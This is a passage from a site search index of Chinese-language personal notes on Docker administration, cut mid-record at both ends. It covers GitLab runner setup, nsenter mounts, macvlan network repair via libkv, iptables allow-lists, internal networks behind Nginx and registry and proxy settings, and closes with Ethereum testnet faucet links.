\u4e3a\u4e86\u8dd1\u672c\u5730\u5df2\u7ecf\u5b58\u5728\u7684\u955c\u50cf\uff08\u9ed8\u8ba4\u4e3aalways\u8868\u793a\u53ea\u80fd\u8dd1dockerhub\u4e0a\u7684\uff09\uff0c\u5728[runners.docker]\u4e2d\u9700\u8981\u6dfb\u52a0\uff1a pull_policy = \"never\" \u6216\u8005\u8fd9\u91cc\u4f60\u4e5f\u53ef\u4ee5\u4f7f\u7528\u201dif-not-present\u201d \u4e0d\u5b58\u5728\u5c31pull \u53e6\u5916 \u5982\u679c\u9700\u8981\u4fee\u6539\u5bb9\u5668DNS\uff0c\u4e5f\u6dfb\u52a0\u8fdb\u53bb\u5373\u53ef dns = [\"10.0.0.1\"]","title":"\u7b2c\u56db\u6b65 \u4fee\u6539\u914d\u7f6e\u6587\u4ef6"},{"location":"Docker/#runner","text":"\u5982\u679c\u9700\u8981\u6539dns\uff0c\u8fd9\u91cc\u4e5f\u522b\u5fd8\u8bb0\u5199\u4e0a docker run - d -- name gitlab - runner -- restart always \\ - v / dockerfiles / gitlabrunner : / etc / gitlab - runner \\ - v / var / run / docker . sock : / var / run / docker . sock \\ -- dns 10.0 . 0.1 \\ gitlab / gitlab - runner : latest","title":"\u7b2c\u4e94\u6b65 \u542f\u52a8runner\u5bb9\u5668"},{"location":"Docker/#repo","text":"\u65b0\u5efa .gitlab-ci.yml \u6587\u4ef6\uff0c\u8fd9\u91cc\u4f7f\u7528\u81ea\u5df1\u7f16\u8bd1\u7684myubuntu\u955c\u50cf image : myubuntu : latest test : app : script : - echo ok - curl ip . cn \u7136\u540e\u5728gitlab\u7684\u4ed3\u5e93\u9875\u9762 \u6700\u65b0\u7684\u4e00\u6b21commit message\u53f3\u4fa7\u5c31\u6709CI\u6210\u529f\u4e0e\u5426\u72b6\u6001\u7684\u56fe\u6807 \u70b9\u8fdb\u53bb\u770b\u8be6\u7ec6\u65e5\u5fd7\u54af","title":"\u7b2c\u516d\u6b65 \u521b\u5efa\u4e00\u4e2a\u65b0\u7684repo\u6765\u6d4b\u8bd5\u4e00\u4e0b\u5427"},{"location":"Docker/#socat","text":"@TAG \u7aef\u53e3\u8f6c\u53d1 \u51fa\u4e8e\u5b66\u4e60\u76ee\u7684\uff0c\u60f3\u5feb\u901f\u5730\u5efa\u7acb\u4e00\u4e0b\u4e34\u65f6\u7684Docker\u5bb9\u5668\u7aef\u53e3\u6620\u5c04 \u7528socat\u54af\uff1a socat TCP4-LISTEN:9300,fork TCP4:172.17.0.3:9300 \u5982\u679c\u6ca1\u6709socat\uff0c\u53ef\u4ee5\uff1a docker run -ti --rm --net host bobrik/socat TCP4-LISTEN:9300 TCP4:172.17.0.3:9300","title":"\u4e3a\u5df2\u7ecf\u5b58\u5728\u7684\u5bb9\u5668\u521b\u5efa\u4e34\u65f6\u7aef\u53e3\u6620\u5c04 socat"},{"location":"Docker/#_13","text":"docker stats \u5c31\u80fd\u770b\u5230\u5b9e\u65f6\u66f4\u65b0\u7684\u7ed3\u679c\uff0c\u4f46\u5e76\u6ca1\u6709\u63d0\u4f9b\u6392\u5e8f\u529f\u80fd docker stats --no-stream|sort -h -r -k 4,4 \u6392\u5e8f\u5217\u5bf9\u5e94\u5173\u7cfb\u5982\u4e0b\uff1a \u5217\u53f7 \u5217\u540d 3 CPU 4 \u5185\u5b58 8 \u7f51\u7edc\u6d41\u5165 10 \u7f51\u7edc\u6d41\u51fa 11 \u6587\u4ef6\u5199\u5165 13 \u6587\u4ef6\u8bfb\u53d6 14 \u5bb9\u5668\u5185\u7ebf\u7a0b\u6570\u91cf(PID\u6570)","title":"\u67e5\u770b\u6240\u6709\u5bb9\u5668\u5185\u5b58\u5360\u7528 \u5e76\u6392\u5e8f"},{"location":"Docker/#_14","text":"Docker\u81ea\u8eab\u53ea\u5141\u8bb8\u5728\u521b\u5efa\u5bb9\u5668\u7684\u65f6\u5019\u6307\u5b9a-v\u8fdb\u884c\u76ee\u5f55\u6302\u8f7d\uff0c\u600e\u4e48\u5728\u4e0d\u505c\u6b62\u5bb9\u5668\u7684\u60c5\u51b5\u4e0b\u589e\u52a0\u6302\u8f7d\u5462\uff1f \u6ce8\u610f\u6b64\u65b9\u6cd5\u5728\u5bb9\u5668\u91cd\u542f\u540e\u5373\u5931\u6548\uff0c\u9700\u8981\u91cd\u65b0\u6302\u8f7d \u53c2\u8003\uff1ahttps://medium.com/kokster/mount-volumes-into-a-running-container-65a967bee3b5 \u65b9\u6cd5\u662f\u628a\u5757\u8bbe\u5907\u6302\u8f7d\u5230\u5bb9\u5668\u4e2d\uff0c\u7136\u540e\u53ef\u4ee5\u4f7f\u7528bind mount \u5047\u8bbe\u5bb9\u5668\u540d\u79f0\u4e3aapp_container\uff0c\u9700\u8981\u6302\u8f7d/dev/sdb1\u8fd9\u4e2a\u8bbe\u5907\uff0c\u547d\u4ee4\u5982\u4e0b\uff1a Step1: \u9996\u5148\u8981\u67e5\u770b\u8bbe\u5907id\u4ee5\u4fbf\u5728\u5bb9\u5668\u4e2dmknod\u521b\u5efa\u8bbe\u5907\uff0c\u7136\u540e\u4f7f\u7528nsenter\u4f7f\u7528\u4e3b\u673a\u7684\u6743\u9650\u6302\u8f7d\u8bbe\u5907 Step2: \u73b0\u5728\u5c31\u53ef\u4ee5\u5728\u5bb9\u5668\u4e2d\u4f7f\u7528/tmpmount\u8bfb\u53d6\u5230\u8bbe\u5907\u4e86\uff0c\u4f46\u5982\u679c\u6211\u4eec\u53ea\u9700\u8981\u6302\u8f7d\u5176\u4e2d\u4e00\u4e2a\u6587\u4ef6\u5939 \u4f8b\u5982\u8bbe\u5907\u7684data\u6587\u4ef6\u5939\u6302\u8f7d\u5230\u5bb9\u5668\u7684/newdata\uff0c\u8fd8\u53ef\u4ee5\u7ee7\u7eed\u6267\u884c\uff1a Step3: \u6700\u540e\u6e05\u7406\u6389\u4e34\u65f6\u6302\u8f7d\u7684/tmpmount \u4e0d\u4f1a\u5f71\u54cdbind mount\u6302\u8f7d\u51fa\u6765\u7684/newdata CONTAINER_NAME=\"app_container\" DEVICE_NAME=\"/dev/sdb1\" MOUNT_SRC=\"data\" MOUNT_TARGET=\"/newdata\" # Step1 x=$(grep $DEVICE_NAME /proc/self/mountinfo|cut -d ' ' -f 3) docker exec -it -u root $CONTAINER_NAME sh -c \"[ -b $DEVICE_NAME ] || mknod -m 0600 $DEVICE_NAME b ${ x / : / } \" sudo nsenter --target \"$(docker inspect --format '{{.State.Pid}}' $CONTAINER_NAME )\" --mount --uts --ipc --net --pid -- sh -c \"mkdir -p /tmpmount;mount $DEVICE_NAME /tmpmount\" # Step2 sudo nsenter --target \"$(docker inspect --format '{{.State.Pid}}' $CONTAINER_NAME )\" --mount --uts --ipc --net --pid -- sh -c \"mkdir -p $MOUNT_TARGET ; mount -o bind /tmpmount/ $MOUNT_SRC $MOUNT_TARGET \" # Step3 sudo nsenter --target \"$(docker inspect --format '{{.State.Pid}}' $CONTAINER_NAME )\" --mount --uts --ipc --net --pid -- sh -c \"umount /tmpmount\"","title":"\u8fd0\u884c\u4e2d\u7684\u5bb9\u5668\u6dfb\u52a0\u76ee\u5f55\u6302\u8f7d"},{"location":"Docker/#docker32","text":"\u4f8b\u5982ubuntu16.04.5 32\u4f4d\u955c\u50cf \u4ece\u8fd9\u91cc\u4e0b\u8f7di386\u540e\u7f00\u7684 ubuntu-base-16.04.5-base-i386.tar.gz \uff1a http://cdimage.ubuntu.com/ubuntu-base/releases/16.04/release/ \u4e0b\u8f7d\u4e86\u4e4b\u540e\u76f4\u63a5\u4ea4\u7ed9docker\u5bfc\u5165\u5373\u53ef\uff1a docker import \u6587\u6863 cat ubuntu - base - 16.04 . 5 - base - i386 . tar . gz | docker import - ubuntu1604_32bit","title":"Docker\u4f7f\u752832\u4f4d\u955c\u50cf"},{"location":"Docker/#varlibdocker","text":"\u4f7f\u7528 docker-backup : curl - Lo / usr / local / bin / docker - backup https : // raw . githubusercontent . com / vincepare / docker - backup / master / docker - backup . sh && chmod + x / usr / local / bin / docker - backup docker - backup ls - w container \u4e3e\u4e2a\u4f8b\u5b50 Apache\u5bb9\u5668\u7531\u4e8e/tmp/httpd_lua_shm.1\u7684\u5b58\u5728\u8dd1\u4e0d\u8d77\u6765\uff0c\u8bd5\u8bd5\u76f4\u63a5\u5220\u9664\u5bb9\u5668\u5185\u7684\u8fd9\u4e2a\u6587\u4ef6 for i in `d ps -a|grep Exit|grep minutes|awk '{print $1}'`; do rm `docker-backup ls -w $i`/tmp/httpd_lua_shm.1; d start $i ; done","title":"\u627e\u5230/var/lib/docker\u4e2d\u5bb9\u5668\u7684\u6570\u636e\u5b58\u50a8\u76ee\u5f55"},{"location":"Docker/#dockermacvlan","text":"\u9700\u6c42\uff1a\u670d\u52a1\u5668\u673a\u623f\u642c\u8fc1\uff0c\u4ece10.214.10.x\u53d8\u4e3a10.214.160.x\uff0c\u914d\u7f6e\u7684macvlan\u5bb9\u5668\u5c31\u4e0d\u80fd\u8bbf\u95ee\u4e86 Docker\u6ca1\u6709\u63d0\u4f9b\u4fee\u6539\u7f51\u7edc\u914d\u7f6e\u7684\u65b9\u6cd5\uff0c\u6211\u4eec\u5c31\u76f4\u63a5\u6539Docker\u7684\u6570\u636e\u5e93\u548c\u914d\u7f6e\u6587\u4ef6\u5457 \u4e0d\u8fd9\u6837\u76f4\u63a5\u6539\u5e95\u5c42\u6587\u4ef6\u4e5f\u662f\u53ef\u4ee5\u7684\uff0c\u9700\u8981\u5148disconnect\u65e7\u7684macvlan\u6240\u6709\u5bb9\u5668\uff0c\u7136\u540e\u5220\u6389\u91cd\u5efa\u8fd9\u4e2anetwork\uff0c\u518d\u4e00\u4e2a\u4e2a\u52a0\u56de\u6765 \u7f51\u7edc\u914d\u7f6e\u7684\u6570\u636e\u5e93\u5728 /var/lib/docker/network/files/local-kv.db \uff0c\u672c\u8d28\u4e0a\u662fboltdb\uff0c\u9700\u8981\u4f7f\u7528docker\u7684 libkv \u6765\u8fdb\u884c\u8bbf\u95ee \u6ce8\u610f\u5230ip\u524d\u7f00\u7684\u957f\u5ea6\u53d1\u751f\u4e86\u53d8\u5316\uff0c\u76f4\u63a5sed\u662f\u4e0d\u884c\u7684\uff0c\u4f1a\u635f\u574f\u6570\u636e\u5e93\uff08\u5982\u679c\u957f\u5ea6\u6ca1\u53d8\u53ef\u4ee5\u76f4\u63a5sed\uff09\uff0c\u64cd\u4f5c\u524d\u8bb0\u5f97\u5907\u4efd \u53c2\u8003 https://blog.qiqitori.com/?p=463 \u52a0\u4ee5\u4fee\u6539\uff0c\u9700\u8981\u5728 docker pull golang:1.8 \u4e2d\u7f16\u8bd1\u8fd0\u884c package main import ( \"time\" \"log\" \"strings\" \"github.com/docker/libkv\" \"github.com/docker/libkv/store\" \"github.com/docker/libkv/store/boltdb\" ) func init () { // Register boltdb store to libkv boltdb . Register () } func main () { client : = \"./local-kv.db\" // ./ appears to be necessary // Initialize a new store kv , err : = libkv . NewStore ( store . BOLTDB , // or \"boltdb\" [] string { client }, & store . Config { Bucket : \"libnetwork\" , ConnectionTimeout : 10 * time . Second , }, ) if err != nil { log . Fatalf ( \"Cannot create store: %v\" , err ) } pair , err : = kv . List ( \"docker/network\" ) for _ , p : = range pair { println ( \"key:\" , string ( p . Key )) val : = strings . Replace ( string ( p . Value ), \"10.214.10.\" , \"10.214.160.\" , - 1 ) println ( \"value:\" , val ) err = kv . Put ( p . Key , [] byte ( val ), nil ) } } \u5176\u4e2d\u9700\u8981\u6ce8\u610fgolang1.8\u7684strings\u6ca1\u6709ReplaceAll\u65b9\u6cd5\uff1bstring\u8f6cbytes\u6570\u7ec4\u7528 []byte(...) \u5373\u53ef\uff1b println \u4e0d\u662ffmt\u5e93\u7684\uff0c\u662f\u5f80stderr\u8f93\u51fa\u7684 \u9664\u4e86\u7f51\u7edc\u6570\u636e\u5e93\u8fd8\u9700\u8981\u4fee\u6539\u5bb9\u5668\u7684.json\u914d\u7f6e\u6587\u4ef6\uff1a /var/lib/docker/containers/*/*.json sed - i 's/10.214.10./10.214.160./g' / var / lib / docker / containers /*/*. json \u7136\u540e\u5c31\u80fd\u542f\u52a8docker\u4e86\uff0c\u5982\u679c\u6709\u5bb9\u5668\u7684\u5f53\u524dip\u5df2\u7ecf\u88ab\u5176\u4ed6\u8bbe\u5907\u5360\u7528\uff0c\u53ef\u4ee5\u901a\u8fc7\u8131\u79bb\u7f51\u7edc\u518d\u52a0\u5165\u6765\u4fee\u6539ip docker network disconnect macvlan_name container_name docker network connect macvlan_name container_name --ip \u65b0\u7684ip \u5982\u679c\u65b0\u7684ip\u8fd8\u662fping\u4e0d\u4e86\uff0c\u8bd5\u8bd5\u91cd\u542f\u5bb9\u5668","title":"\u642c\u8fd0\u670d\u52a1\u5668\u540e\u7f51\u6bb5\u53d8\u5316 \u76f4\u63a5\u4fee\u6539Docker\u5e95\u5c42\u6570\u636e\u5e93\u548c\u914d\u7f6e\u6587\u4ef6\u4fee\u590dmacvlan\u7f51\u7edc"},{"location":"Docker/#2","text":"docker ps -a --format ' {{ .Names }} {{ .Status }} '|grep \"2 month\"|awk '{print $1}'|tr '\\r\\n' ' '","title":"\u83b7\u53d62\u4e2a\u6708\u524d\u9000\u51fa\u7684\u5bb9\u5668\u5217\u8868\uff0c\u4ee5\u7a7a\u683c\u5206\u9694"},{"location":"Docker/#ping-ipnsenter","text":"netin(){ nsenter --target `docker inspect --format ' {{ .State.Pid }} ' $1` --net --pid /bin/bash } \u8fd9\u662f\u8fdb\u5165docker\u5bb9\u5668\u7684namespace\uff0c\u4f46\u53ea\u5207\u6362\u7f51\u7edc\u548c/proc\uff0c\u6587\u4ef6\u7cfb\u7edf\u7b49\u8fd8\u662f\u4f7f\u7528\u4e3b\u673a\u7684 \u8fdb\u5165\u540ebash\u4f3c\u4e4e\u6ca1\u53d8\uff0c\u8fd9\u65f6\u53ef\u4ee5ps\u770b\u770b\u8fdb\u7a0b\u5217\u8868\u53d8\u4e86\u5c31\u8bf4\u660e\u5728\u5bb9\u5668\u91cc\u9762\u4e86\uff0c\u7136\u540e\u53ef\u4ee5\u6109\u5feb\u5730ifconfig\u548cping\u4e86 \u4e5f\u53ef\u4ee5\u4f7f\u7528ip\u547d\u4ee4\u6307\u5b9anetns\u7684\u65b9\u5f0f ip netns exec \u540d\u79f0 \u547d\u4ee4 1 2 3 4 5 6 #!/bin/bash NAME = \"container name\" mkdir -p /var/run/netns ID = ` docker inspect --format = '{{ .State.Pid }}' $NAME ` sudo ln -sf \"/proc/ $ID /ns/net\" /var/run/netns/ $NAME exec sudo ip netns exec $NAME \" $@ \"","title":"\u5bb9\u5668\u5185\u6ca1\u6709ping, ip\uff1f\u76f4\u63a5nsenter\u8fdb\u53bb\u770b\u770b"},{"location":"Docker/#macvlanip_2","text":"\u5c06\u5bb9\u5668\u66b4\u9732\u5728\u6574\u4e2a\u5185\u7f51\u8fd8\u662f\u4e0d\u591f\u5b89\u5168\uff0c\u4e0d\u5982\u4f7f\u7528iptables\u53ea\u5141\u8bb8\u7279\u5b9aIP\u6bb5\u8bbf\u95ee\u8fd9\u4e2a\u5bb9\u5668\u7684IP \u6309\u4e0a\u8ff0\u64cd\u4f5c\u4e4b\u540e\uff0c\u5047\u8bbe\u5bb9\u5668\u540d\u79f0\u4e3aname\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u5148\u5efa\u7acb\u4e00\u4e2aalias\u6765\u5feb\u901fiptables: \u53c2\u8003\uff1a https://unix.stackexchange.com/questions/11851/iptables-allow-certain-ips-and-block-all-other-connection alias i=\"sudo ip netns exec name iptables\" i -P FORWARD DROP # we aren't a router i -A INPUT -m state --state INVALID -j DROP i -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT i -A INPUT -i lo -j ACCEPT i -A INPUT -s 10.0.0.1/24 -j ACCEPT i -A INPUT -s 172.19.0.1/24 -j ACCEPT i -P INPUT DROP # Drop everything we don't accept \u6548\u679c\u5c31\u662f\u53ea\u6709\u5185\u7f5110.0.0.1-10.0.0.254\u7684ip\u624d\u80fd\u8bbf\u95ee\u8fd9\u4e2a\u5bb9\u5668\u7684IP\uff0c\u5176\u4ed6\u6765\u6e90\u90fd\u4e0d\u80fdping\u901a\u8fd9\u4e2a\u5bb9\u5668 \u4e0b\u9762\u7684bash\u811a\u672c\u4f1a\u81ea\u52a8\u5bf9\u5bb9\u5668\u7684\u6240\u6709IP\u6bb5\u5141\u8bb8\u8bbf\u95ee\uff0c\u5e76\u62d2\u7edd\u5176\u4ed6\u8bbf\u95ee\uff1a \u5176\u4e2d\u7684docker inspect\u547d\u4ee4\u53ef\u4ee5\u83b7\u53d6\u5bb9\u5668\u62e5\u6709\u7684\u6240\u6709IP 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 #!/bin/bash set -ex DOCKERNAME = \"xxx\" NAME = \"xx\" shopt -s expand_aliases sudo mkdir -p /var/run/netns ID = ` docker inspect --format = '{{ .State.Pid }}' ${ DOCKERNAME } ` sudo ln -sf \"/proc/ $ID /ns/net\" /var/run/netns/ ${ NAME } alias i = \"sudo ip netns exec ${ NAME } iptables\" i -F i -P FORWARD DROP # we aren't a router i -A INPUT -m state --state INVALID -j DROP i -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT i -A INPUT -i lo -j ACCEPT docker inspect --format = '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{\"\\n\"}}{{end}}' ${ DOCKERNAME } | xargs -i sudo ip netns exec ${ NAME } iptables -A INPUT -s '{}/24' -j ACCEPT i -P INPUT DROP # Drop everything we don't accept","title":"\u4e3amacvlan\u7684\u5bb9\u5668\u914d\u7f6e\u53ea\u5141\u8bb8IP\u6bb5\u8bbf\u95ee"},{"location":"Docker/#varlibdocker_1","text":"\u8bfb\u53d6/var/lib/docker/containers/*/config.v2.json\u53ef\u4ee5\u8bfb\u5230\u5bb9\u5668\u5f00\u59cb\u65f6\u95f4 \u4f46\u4f7f\u7528\u540c\u4e00\u4e2a\u6587\u4ef6\u5939\u4e0bhostname\u8fd9\u4e2a\u6587\u4ef6\u7684\u65f6\u95f4\u6233\u66f4\u53ef\u9760\uff0c\u65e0\u9700\u8003\u8651\u65f6\u533a\u6362\u7b97\u4e0d\u540c\u670d\u52a1\u5668\u65f6\u95f4\u4e0d\u540c\u6b65\u7b49\u95ee\u9898\u3002\u8ba1\u7b97\u6587\u4ef6\u4ea7\u751f\u7684\u76f8\u5bf9\u65f6\u95f4\u7528os.path.getmtime(\u8fd9\u4e2a\u6587\u4ef6)\u51cf\u53bb\u8fd9\u4e2a\u65f6\u95f4\u6233\u5373\u53ef\u3002 \u5bfc\u5165\u5230mysql \u5b8c\u6574\u4ee3\u7801\uff1a \u6267\u884c\u7684\u65f6\u5019\u9700\u8981server name\u4f5c\u4e3a\u53c2\u6570 from bugid import runsql import os , sys , glob , json import datetime import re server = sys . argv [ 1 ] os . chdir ( \"/var/lib/docker/containers\" ) sql = \"replace into dockers(server, name, id, starttime, runningtime, memlimit) values \" sqlpending = [] t = 0 for i in glob . glob ( \"*/\" ) : if not os . path . exists ( i+ \"hostname\" ) : # print ( i ) continue data = json . loads ( open ( i+ \"config.v2.json\" ). read ()) name = data [ \"Name\" ] starttime = data [ \"State\" ][ \"StartedAt\" ] endtime = data [ \"State\" ][ \"FinishedAt\" ] if endtime ! = \"0001-01-01T00:00:00Z\" : runningtime = ( datetime . datetime . strptime ( endtime . split ( \".\" )[ 0 ], \"%Y-%m-%dT%H:%M:%S\" ) - datetime . datetime . strptime ( starttime . split ( \".\" )[ 0 ], \"%Y-%m-%dT%H:%M:%S\" )). total_seconds () else : runningtime = - 1 memlimit = int ( json . load ( open ( i+ \"hostconfig.json\" ))[ \"Memory\" ] / 1024 / 1024 ) sqlpending . extend ([ server , name [ 1 : ], i [:- 1 ], int ( os . path . getmtime ( i+ \"hostname\" )), runningtime , memlimit ]) sql += \"(%s, %s, %s, %s, %s, %s),\" # print ( sqlpending ) runsql ( sql [:- 1 ], * sqlpending )","title":"\u4ece/var/lib/docker\u63d0\u53d6\u5bb9\u5668\u5f00\u59cb\u65f6\u95f4"},{"location":"Docker/#ip_1","text":"\u53c2\u8003\uff1a https://github.com/johnnian/Blog/issues/16 \u9ed8\u8ba4\u7684bridge\u7f51\u7edc\u4e0d\u652f\u6301\u6307\u5b9aip\uff0c\u9700\u8981\u518d\u521b\u5efa\u4e00\u4e2a\u7f51\u7edc\uff1a docker network create --subnet=172.18.0.0/16 b \u521b\u5efa\u5bb9\u5668\u7684\u65f6\u5019\u53ef\u4ee5 --network b --ip 172.18.0.2 \u5df2\u7ecf\u5b58\u5728\u7684\u5bb9\u5668\u9700\u8981\u7528\uff1a docker network connect --ip 172.18.0.2 --alias ${ name } b ${ name } \u4e0d\u60f3\u6539\u52a8docker\u7684network\u8fd8\u6709\u4e2a\u4e34\u65f6\u7684\u529e\u6cd5\uff1a","title":"\u56fa\u5b9a\u5bb9\u5668\u7684IP"},{"location":"Docker/#ip-etchosts","text":"\u9700\u8981\u5148\u5c06\u5f53\u524d\u7684hosts\u6587\u4ef6\u590d\u5236\u4e3a/etc/hosts.base \u5176\u4e2dbridge\u53ef\u80fd\u9700\u8981\u6539\u6210docker inspect\u8f93\u51fa\u7684\u5176\u4ed6network\u540d\u79f0 1 2 3 4 5 6 7 #!/bin/bash if [[ $EUID -ne 0 ]] ; then echo \"This script must be run as root\" exit 1 fi cp /etc/hosts.base /etc/hosts echo ` docker inspect ${ name } --format '{{.NetworkSettings.Networks.bridge.IPAddress}}' ` ${ name } >> /etc/hosts \u53e6\u5916 \u4f60\u8fd8\u53ef\u4ee5\u542f\u52a8\u4e2adns\u670d\u52a1\u7684\u5bb9\u5668\u6765\u89e3\u6790\u5bb9\u5668hostname: https://stackoverflow.com/questions/37242217/access-docker-container-from-host-using-containers-name/45071126#45071126","title":"\u83b7\u53d6\u5bb9\u5668IP \u66f4\u65b0\u4e3b\u673a/etc/hosts"},{"location":"Docker/#docker-web","text":"@TAG \u7aef\u53e3\u6620\u5c04 ctf \u9996\u5148\u6392\u9664 --network none \uff0c\u8fd9\u6837\u6ca1\u6709\u7f51\u5361\u600e\u4e48\u505a\u7aef\u53e3\u6620\u5c04 \u4e0b\u9762\u5047\u8bbe\u5bb9\u5668\u540d\u79f0\u4e3a ${CONTAINER} \uff0c\u5bb9\u5668\u542f\u52a8\u7684http\u670d\u52a1\u7aef\u53e3\u4e3a5000","title":"Docker\u5bb9\u5668\u7981\u6b62\u4e3b\u52a8\u8054\u7f51 \u4f46\u5bf9\u5916\u63d0\u4f9bweb\u670d\u52a1"},{"location":"Docker/#_15","text":"nsenter --target `docker inspect --format '{{.State.Pid}}' ${ CONTAINER } ` --net --pid route delete default \u597d\u5904\u5728\u4e8e\u8bbf\u95ee\u7f51\u7edc\u7684\u8bf7\u6c42\u80fd\u8fc5\u901f\u62a5\u9519 Network is unreachable \uff0c\u4e5f\u4e0d\u9700\u8981\u989d\u5916\u7684\u5bb9\u5668\u53c2\u6570\u914d\u7f6e \u4f46\u5bb9\u5668\u6bcf\u6b21\u91cd\u542f\u90fd\u9700\u8981\u91cd\u65b0\u6267\u884c","title":"\u7b80\u5355\u65b9\u6848 \u76f4\u63a5\u5220\u9664\u9ed8\u8ba4\u8def\u7531"},{"location":"Docker/#nginx","text":"docker\u7684\u521b\u5efa\u7f51\u7edc\u63d0\u4f9b\u4e86 --internal \u53c2\u6570\uff0c\u610f\u601d\u662f\u4e0d\u5141\u8bb8\u8fd9\u4e2a\u7f51\u7edc\u8bbf\u95ee\u5916\u754c\uff0c\u4f46\u662f\u8bbf\u95ee\u7f51\u7edc\u7684\u8bf7\u6c42\u4e0d\u4f1a\u7acb\u523b\u8fd4\u56de\uff0c\u6548\u679c\u50cf\u662f\u4e00\u76f4\u4e22\u5305\u5c31\u6ca1\u54cd\u5e94 \u8fd9\u91cc\u6211\u4eec\u521b\u5efa\u4e00\u4e2a\u540d\u4e3a ${CONTAINER}_nonet \u7684\u7f51\u7edc\uff0c\u542f\u52a8\u5bb9\u5668\u7684\u65f6\u5019\u6307\u5b9a\u8fd9\u4e2a\u7f51\u7edc\u5e76\u914d\u7f6e\u522b\u540dapp \u7136\u540e\u8fd8\u9700\u8981Nginx\u5bb9\u5668\u540c\u65f6\u52a0\u5165\u9ed8\u8ba4\u7f51\u7edc\u548c\u8fd9\u4e2a\u7f51\u7edc\u6765\u8fdb\u884c\u8f6c\u53d1\uff0cNginx\u5bb9\u5668\u4e00\u5f00\u59cb\u521b\u5efa\u540e\u7684\u542f\u52a8\u4f1a\u62a5\u9519\u53cd\u590d\u91cd\u542f\uff08\u65e0\u6cd5\u89e3\u6790app\uff09\uff0c\u52a0\u5165\u7f51\u7edc\u540e\u5373\u53ef\u6b63\u5e38\u542f\u52a8 docker network create $ { CONTAINER } _nonet -- internal docker run -- network $ { CONTAINER } _nonet -- network - alias app ... docker run -- name $ { CONTAINER } _nginx - d - v `pwd` / nginxconf :/ etc / nginx / conf . d - p 20528 : 80 -- restart = always nginx docker network connect $ { CONTAINER } _nonet $ { CONTAINER } _nginx -- alias nginx \u5176\u4e2dnginxconf\u6587\u4ef6\u5939\u91cc\u653e\u4e00\u4e2adefault.conf: server { listen 80; server_name localhost; location / { proxy_pass http://app:5000; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; } } \u65e2\u7136\u7528\u4e86\u53cd\u5411\u4ee3\u7406\uff0c\u5e94\u7528\u5c42\u4e5f\u9700\u8981\u914d\u7f6e\u4e00\u4e0bIP\u76f8\u5173\u7684\u4fee\u590d\u624d\u80fd\u4f7f\u65e5\u5fd7\u663e\u793a\u8bbf\u95ee\u8005ip\uff08\u800c\u4e0d\u662fNginx\u5bb9\u5668\u7684IP\uff09\uff0c\u6bd4\u5982Flask 1.0\u9700\u8981\uff1a from werkzeug.middleware.proxy_fix import ProxyFix app . wsgi_app = ProxyFix ( app . wsgi_app ) \u8fd9\u4e2a\u65b9\u6848\u6709\u70b9\u590d\u6742\uff0c\u4f46\u597d\u5904\u5728\u4e8e\u91cd\u542f\u5bb9\u5668\u4e0d\u9700\u8981\u989d\u5916\u914d\u7f6e\uff0c\u53cd\u6b63\u8fde\u4e0d\u4e0a\u7f51 \u574f\u5904\u5728\u4e8e\u8bbf\u95ee\u7f51\u7edc\u7684\u8bf7\u6c42\u4f1a\u4e00\u76f4\u5361\u4f4f\uff0c\u5e94\u7528\u5c42\u9700\u8981\u81ea\u5df1\u8003\u8651\u8d85\u65f6 \u4f60\u53ef\u4ee5\u628a\u8fd9\u4e24\u79cd\u65b9\u6848\u7ed3\u5408\u8d77\u6765\uff0c\u5373\u4f7f\u5fd8\u4e86\u5220\u9ed8\u8ba4\u8def\u7531\u4e5f\u80fd\u4fdd\u8bc1\u4e0d\u80fd\u8054\u7f51","title":"\u590d\u6742\u65b9\u6848 \u521b\u5efa\u4e2a\u5185\u90e8\u7f51\u7edc Nginx\u8f6c\u53d1"},{"location":"Docker/#registryapi","text":"\u6587\u6863\uff1a https://docs.docker.com/registry/spec/api/ \u5217\u51fa\u6240\u6709\u955c\u50cf\uff1a /v2/_catalog \u5217\u51fa\u6307\u5b9a\u955c\u50cf\u7684\u6240\u6709\u6807\u7b7e\uff1a /v2/<name>/tags/list","title":"\u79c1\u6709registry\u7684api"},{"location":"Docker/#docker-pull_1","text":"\u5b98\u65b9\u6587\u6863\uff1a https://docs.docker.com/config/daemon/systemd/#httphttps-proxy mkdir - p / etc / systemd / system / docker . service . d vi / etc / systemd / system / docker . service . d / http - proxy . conf systemctl daemon - reload systemctl restart docker systemctl show -- property = Environment docker [Service] Environment = \"HTTP_PROXY=http://proxy.example.com:80\" Environment = \"HTTPS_PROXY=https://proxy.example.com:443\" Environment = \"NO_PROXY=localhost,127.0.0.1,docker-registry.example.com,.corp\"","title":"\u914d\u7f6edocker pull\u4f7f\u7528\u4ee3\u7406"},{"location":"Docker/#docker-daemon_1","text":"\u53c2\u8003\uff1a https://docs.docker.com/config/containers/live-restore/ # vi /etc/docker/daemon.json { \"live-restore\" : true } # systemctl reload docker","title":"\u914d\u7f6edocker daemon\u9000\u51fa\u65f6\u4e0d\u81ea\u52a8\u5173\u95ed\u5bb9\u5668"},{"location":"ETH/","text":"ETH \u00b6 \u5b66\u4e60\u4e00\u4e0b\u4ee5\u592a\u574a\uff0c\u76ee\u524d\u53ef\u4ee5\u5728\u533a\u5757\u94fe\u4e0a\u523b\u5b57\u4e86\uff0c\u6bcf\u4e2a\u4ea4\u6613\u53ef\u4ee5\u5b58\u50a830K\u7684\u5185\u5bb9 \u83b7\u53d6\u6d4b\u8bd5\u7f51\u7edcropsten\u7684ETH \u00b6 \u76ee\u524d\u7684faucet\u5217\u8868\uff0c\u4e0d\u8fc7\u6709\u53ef\u80fd\u4ed6\u4eec\u5de5\u4f5c\u5728fork\u4e0a\uff0c\u83b7\u5f97\u7684eth\u4e0d\u80fd\u5728etherscan\u4e0a\u770b\u5230 \u8fd1\u671f\u4ee5\u592a\u574aRopsten\u6d4b\u8bd5\u7f51\u7684Istanbul\u5347\u7ea7\u7531\u4e8e\u5927\u90e8\u5206\u7b97\u529b\u6ca1\u6709\u5347\u7ea7\u8282\u70b9\u8f6f\u4ef6\uff0c\u5b9e\u9645\u4e0a\u5df2\u7ecf\u53d1\u751f\u4e86\u5206\u53c9 https://faucet.ropsten.be https://faucet.metamask.io http://faucet.bitfwd.xyz \u751f\u6210\u4e00\u5806\u4e0eMetaMask\u517c\u5bb9\u7684\u5730\u5740 \u00b6 